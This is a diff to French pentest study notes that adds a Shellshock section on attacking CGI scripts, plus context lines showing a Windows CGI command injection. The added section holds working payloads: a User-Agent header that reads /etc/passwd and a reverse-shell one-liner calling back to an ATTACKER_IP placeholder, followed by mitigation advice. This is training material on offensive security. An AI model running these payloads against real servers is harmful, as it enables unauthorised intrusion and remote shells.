@@ -926,6 +926,48 @@ Actions concises pour passer de l'énumération à l'exploitation (RCE) quand po
   - Exemple encodé : `http://<host>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
 - Si exécution directe bloquée : écrire un fichier via redirection (`echo`) puis l'exécuter (tout en URL-encodant).
 
-## Resources
-- [ffuf](https://github.com/ffuf/ffuf)  
-- [nmap](https://nmap.org)  
+---
+
+# Attacking Common Gateway Interface (CGI) Applications - Shellshock
+
+## Quick facts
+- Vuln connue : Shellshock (`CVE-2014-6271`) — faille dans Bash (versions vulnérables ≤ 4.3).
+- Contexte fréquent : scripts CGI (`/cgi-bin/*.cgi`, `.pl`, `.sh`, `.bat`, `.cmd`) exécutés par le serveur web.
+- Impact : exécution de commandes au contexte de l’utilisateur du serveur web (souvent `www-data`).
+
+## Principe (Shellshock)
+- Bash interprète mal certaines fonctions définies dans les variables d’environnement ; du code placé après la définition de fonction peut être exécuté.
+- Exemple local de démonstration :
+  - `env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"`
+  - Si vulnérable, la sortie contiendra `vulnerable-shellshock`.
+
+## Enumeration (chercher des CGI)
+- Rechercher répertoire CGI : `gobuster dir -u http://<host>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`
+- Tester les fichiers découverts : `curl -i http://<host>/cgi-bin/access.cgi`
+
+## Test de vulnérabilité via header (User-Agent)
+- Test simple (lecture de `/etc/passwd`) :
+  - `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<host>/cgi-bin/access.cgi`
+- Si la sortie contient `/etc/passwd` → vulnérable.
+
+## Exemple d’exploitation (reverse shell)
+- One-liner Bash pour callback (listener sur vous) :
+  - `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<host>/cgi-bin/access.cgi`
+
+## Exemple de vérification d’environnement
+- Lister variables d’environnement exposées par le CGI :
+  - `curl 'http://<host>/cgi-bin/access.cgi?&set'`
+  - Utile pour connaître `SCRIPT_FILENAME`, `COMSPEC`, `PATH`, etc.
+
+## Notes techniques importantes
+- CGI = middleware : URL → serveur web → exécution script → sortie renvoyée.
+- Shellshock s’exploite souvent via des champs d’entête (User-Agent, Referer, etc.) qui sont passés en variables d’environnement au script CGI.
+- Sur systèmes patchés, Bash n’exécutera pas le code après une définition de fonction importée.
+
+## Mitigation
+- Mettre à jour Bash vers une version non vulnérable.
+- Sur appareils embarqués où mise à jour impossible : restreindre exposition réseau ou retirer CGI vulnérable.
+- Vérifier et durcir exposition des endpoints CGI.
+
+---
+
